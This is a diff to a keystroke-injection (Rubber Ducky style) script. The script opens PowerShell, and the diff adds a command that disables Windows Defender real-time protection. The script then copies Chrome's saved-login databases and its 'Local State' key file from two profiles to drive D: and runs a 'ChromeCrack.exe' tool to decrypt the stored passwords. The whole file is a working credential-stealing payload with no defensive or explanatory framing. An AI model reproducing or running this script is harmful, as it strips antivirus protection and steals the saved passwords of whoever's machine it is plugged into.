@@ -2,22 +2,24 @@ DELAY 800
 GUI r
 DELAY 800
 STRING Powershell
+DELAY 800
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
 ENTER
 DELAY 800
 STRING New-Item -ItemType "directory" -Name "$env:UserName" -Path "d:\" -Force
 ENTER
-DELAY 1000
+DELAY 800
 STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data" -Destination "d:\$env:UserName\"
 ENTER
-DELAY 1000
+DELAY 800
 STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data" -Destination "d:\$env:UserName\"
 ENTER
-DELAY 1000
+DELAY 800
 STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Local State" -Destination "d:\$env:UserName\"
 ENTER
-DELAY 1000
+DELAY 800
 STRING D:\ChromeCrack\ChromeCrack.exe $env:UserName
 ENTER
-DELAY 1000
+DELAY 800
 STRING exit
 ENTER
